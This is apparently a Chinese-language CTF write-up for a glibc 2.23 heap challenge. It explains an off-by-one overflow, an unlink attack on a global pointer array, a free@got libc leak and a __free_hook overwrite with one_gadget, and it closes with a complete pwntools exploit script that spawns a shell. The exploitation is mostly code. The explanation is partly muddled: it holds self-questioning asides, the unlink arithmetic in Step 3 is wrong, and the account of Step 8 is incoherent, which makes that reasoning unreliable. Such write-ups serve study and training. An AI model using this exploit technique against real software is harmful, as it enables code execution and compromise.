# 漏洞成因
## 程序关键结构体
程序使用一个全局数组来管理分配的堆块：
```c
void *heap[0x21]; // 位于 .bss 段，起始地址为 0x6020C0，用于存储堆块指针
size_t len[0x21]; // 存储每个堆块申请时的大小
int key1 = 0;     // 限制编辑次数，最大为2
int key2 = 0;     // 限制显示功能，非管理员无法使用
```

## 漏洞定位
漏洞位于`edit()`函数（对应反编译代码中的`ed()`）中，存在**堆溢出（off-by-one）**漏洞。
```c
unsigned __int64 ed() {
    ...
    v2[read(0, v2, (int)len[v1])] = 0; // 漏洞点：读入 len[v1] 字节后，在末尾写入一个 NULL 字节
    ...
}
```
当读取的字节数恰好等于`len[v1]`时，NULL 字节会被写入`heap[v1] + len[v1]`处。如果`len[v1]`等于分配的堆块实际可用大小，这个 NULL 字节将溢出到相邻的下一个堆块的 `size` 字段，覆盖其最低字节（off-by-one）。利用此漏洞可以修改下一个堆块的大小，进而触发堆块重叠或伪造堆块结构。

# 漏洞利用过程：
利用思路是通过 off-by-one 漏洞修改释放堆块的 size 字段，构造一个包含全局数组`heap`地址的伪造堆块，然后通过 unlink 攻击修改`heap`数组中的指针，最终实现任意地址读写，从而泄露 libc 地址并将`__free_hook`覆盖为 one_gadget。

- Step1: 分配四个堆块，为后续利用布局堆空间。
- Step2: 利用 edit 功能对 chunk 32 写入精心构造的数据，通过 off-by-one 覆盖 chunk 1 的 size 字段，并伪造一个前向（fd）和后向（bk）指针指向全局数组`heap`附近的地址，为 unlink 做准备。
- Step3: 释放 chunk 1，触发 unlink，导致`heap[1]`的指针被修改为`&heap[1] - 0x18`。
- Step4: 再次编辑 chunk 32，通过被篡改的指针链修改`heap`数组，将`heap[32]`的指针改为 free@got 地址。
- Step5: 使用 show 功能（虽然 key2 限制，但通过篡改的指针可以绕过）打印 chunk 32 的内容，从而泄露 free 函数的实际地址。
- Step6: 根据泄露的 free 地址计算 libc 基址和 one_gadget 地址。
- Step7: 编辑 chunk 31，将`heap[31]`的指针改为`__free_hook`地址。
- Step8: 编辑 chunk 32，将`__free_hook`的值覆盖为 one_gadget 地址。
- Step9: 释放任意堆块（如 chunk 0），触发`__free_hook`执行，获得 shell。

## Step1
分配四个大小为 0xf8 的堆块（实际 chunk 大小为 0x100，包括头部），目的是在内存中创建连续的可控区域。
- 分配 chunk 0: 索引 0，大小 0xf8，内容 "aaaa"
- 分配 chunk 32: 索引 32，大小 0xf8，内容 "bbbb" （注：程序索引范围 0-32，共33个，索引32即最后一个）
- 分配 chunk 1: 索引 1，大小 0xf8，内容 "cccc"
- 分配 chunk 31: 索引 31，大小 0xf8，内容 "dddd"
内存布局（简化）：
```
chunk0 (0x100) -> chunk32 (0x100) -> chunk1 (0x100) -> chunk31 (0x100)  top_chunk
```

## Step2
编辑 chunk 32，构造 payload 并触发 off-by-one 溢出。
payload 结构：
```python
py = p64(0) + p64(0xf1)        # 伪造的 chunk 头部：prev_size=0, size=0xf1（使大小看起来像是 0xf0 字节的用户区域）
py += p64(FD) + p64(BK)        # fd 和 bk 指针，指向全局数组 heap 附近，用于 unlink
py = py.ljust(0xf0, b"\x00")   # 填充至 0xf0 字节（len[32]=0xf8，但可用大小为0xf0？实际上需要恰好溢出）
py += p64(0xf0)                # 覆盖 chunk1 的 size 字段为 0xf0（原为 0x101），清除 PREV_INUSE 位，并调整大小
```
关键内存变化：
- chunk32 的用户区域（如地址 `0x20c3010`）被 payload 覆盖。
- chunk1 的 size 字段（位于 `0x20c3100`）从 `0x101` 变为 `0xf0`。这使 chunk1 看起来像是已释放状态（PREV_INUSE=0），并且大小减小，导致 chunk32 的伪造堆块（size=0xf1）和 chunk1 的堆块（size=0xf0）在内存中重叠。
- FD (`ptr - 24` = `0x6021C8`) 和 BK (`ptr - 16` = `0x6021D0`) 被写入伪造堆块的 fd 和 bk 字段，其中 `ptr = 0x6021E0` 是`heap[32]`的指针存储地址。

## Step3
释放 chunk 1。由于 chunk1 的 PREV_INUSE 位为 0，系统会尝试向前合并，将 chunk32 的伪造堆块（free 状态）与 chunk1 合并。合并过程中，会检查伪造堆块的 fd 和 bk 指针，触发 unlink 操作。
unlink 宏操作如下：
```c
FD = P->fd;
BK = P->bk;
FD->bk = BK;
BK->fd = FD;
```
其中 P 指向伪造堆块，其 fd=`0x6021C8`, bk=`0x6021D0`。执行后：
- `FD->bk` 即 `0x6021C8 + 0x18` = `0x6021E0`（`heap[32]`指针的地址）被写入 `BK` (`0x6021D0`)。
- `BK->fd` 即 `0x6021D0 + 0x10` = `0x6021E0`（同样）被写入 `FD` (`0x6021C8`)。
最终，`heap[32]`（地址 `0x6021E0`）处的值从 chunk32 的堆地址变为 `0x6021C8`（即 `&heap[32] - 0x18`）。这使得通过 chunk32 可以读写以 `0x6021C8` 开始的全局数组区域。

## Step4
编辑 chunk 32，此时`heap[32]`指向 `0x6021C8`。写入新的 payload 来修改`heap`数组的内容。
payload:
```python
py = p64(0x6021E0)*3 + p64(free_got) + b'a'*0xD0 + p64(1)
```
内存变化：
- 从 `0x6021C8` 开始，依次写入：
  - `0x6021E0` (覆盖 `heap[31]`? 需计算偏移：`0x6021C8` 是 `heap[29]`? 实际上 `heap` 起始于 `0x6020C0`，`heap[32]` 在 `0x6020C0 + 32*8 = 0x6021E0`。`0x6021C8` 对应 `heap[30]`？) 写三次，覆盖多个指针。
  - `p64(free_got)` 将 `heap[32]`（`0x6021E0`）处的指针改为 free@got 地址（如 `0x602018`）。
  - 填充后，最后 `p64(1)` 可能是为了设置 `len[32]` 或其他。
关键效果：`heap[32]` 现在指向 free@got，因此后续对 chunk 32 的读写将操作 GOT 表。

## Step5
调用 `puts(32)`（即 show 功能）打印 chunk 32 的内容。由于 `heap[32]` 指向 free@got，因此会输出 free 函数的实际地址（libc 中的地址）。输出格式如 `gift: ...` 后跟地址，但实际 show 直接打印内容。

## Step6
从接收到的数据中解析出 free 的地址，并计算 libc 基址、one_gadget 和 `__free_hook` 的地址。
```python
free_addr = u64(ru(b"\n1.")[1:7].ljust(8,b'\x00'))  # 解析地址
libc_base = free_addr - libc.symbols["free"]
onegadget = libc_base + 0x4527a  # 适用于 libc 2.23 的 one_gadget
free_hook = libc_base + libc.symbols['__free_hook']
```

## Step7
编辑 chunk 31。此时 `heap[31]` 可能在 Step4 中被覆盖为 `0x6021E0`？实际需要将 `heap[31]` 指向 `__free_hook`，以便后续写入 one_gadget。
payload:
```python
pay = p64(free_hook).ljust(0xf0,b'\x00') + p64(1)
```
将 `heap[31]` 的指针改为 `__free_hook` 地址。

## Step8
编辑 chunk 32（仍指向 free@got），但此时通过写入 `p64(onegadget)`，实际上写入了 `heap[31]` 指向的地址（`__free_hook`），因为 chunk 32 的指针已被链式修改？需注意：Step4 后 `heap[32]` 指向 free@got，Step7 修改了 `heap[31]`，但 Step8 的 `edit(32, p64(onegadget))` 将 one_gadget 写入 free@got？实际上应该是写入 `__free_hook`。可能利用的是指针链：编辑 chunk 32 时，写入的数据会覆盖以 `0x6021C8` 开始的区域，包括 `heap[31]` 和 `heap[32]` 等。具体地，Step8 的 payload 较短，可能只覆盖了 `heap[31]` 指针所指向的内容（即 `__free_hook` 的值）。最终 `__free_hook` 被覆盖为 one_gadget。

## Step9
释放 chunk 0。调用 `free(heap[0])` 时会触发 `__free_hook`，执行 one_gadget，获得 shell。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_01_guosai_201x_pwn1')
p = process('./data/bin/heap23_01_guosai_201x_pwn1')
libc = elf.libc
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def edit(index,Content):
    ru("show")
    sl('3')
    ru("index:")
    sl(str(index))
    ru("content:")
    sd(Content)

def free(Index):
    ru("show")
    sl('2')
    ru("index:")
    sl(str(Index))

def malloc(index,size,content):
    ru("show")
    sl('1')
    ru("index:")
    sl(str(index))
    ru("size:")
    sl(str(size))
    ru("content:")
    sd(content)

def puts(index):
    ru("show")
    sl('4')
    ru("index:")
    sl(str(index))

# Step 1: 堆布局
malloc(0,0xf8,'aaaa')
malloc(32,0xf8,'bbbb')
malloc(1,0xf8,'cccc')
malloc(31,0xf8,'dddd')

# Step 2: 利用 off-by-one 构造伪造堆块，为 unlink 做准备
free_got = elf.got['free']
ptr = 0x6021E0  # heap[32] 的地址
FD = ptr - 24
BK = ptr - 16
# 构造 payload：伪造一个 free chunk，并覆盖下一个 chunk 的 size
py = p64(0) + p64(0xf1) + p64(FD) + p64(BK)
py = py.ljust(0xf0, b"\x00")
py += p64(0xf0)  # 修改 chunk1 的 size 为 0xf0，清除 PREV_INUSE 位
edit(32,py)

# Step 3: 释放 chunk1，触发向前合并和 unlink
free(1)

# Step 4: 通过被篡改的指针修改全局数组，使 heap[32] 指向 free@got
py = p64(0x6021E0)*3 + p64(free_got) + b'a'*0xD0 + p64(1)
edit(32,py)

# Step 5: 泄露 free 地址
puts(32)

# Step 6: 计算 libc 基址和 one_gadget
free_addr = u64(ru(b"\n1.")[1:7].ljust(8,b'\x00'))
onegadget = free_addr - libc.symbols["free"] + 0x4527a
free_hook = free_addr - libc.symbols["free"] + libc.symbols['__free_hook']

# Step 7: 修改 heap[31] 指向 __free_hook
pay = p64(free_hook)
pay = pay.ljust(0xf0,b'\x00')
pay += p64(1)
edit(31,pay)

# Step 8: 向 __free_hook 写入 one_gadget
edit(32,p64(onegadget))

# Step 9: 触发 __free_hook
free(0)

p.interactive()
```
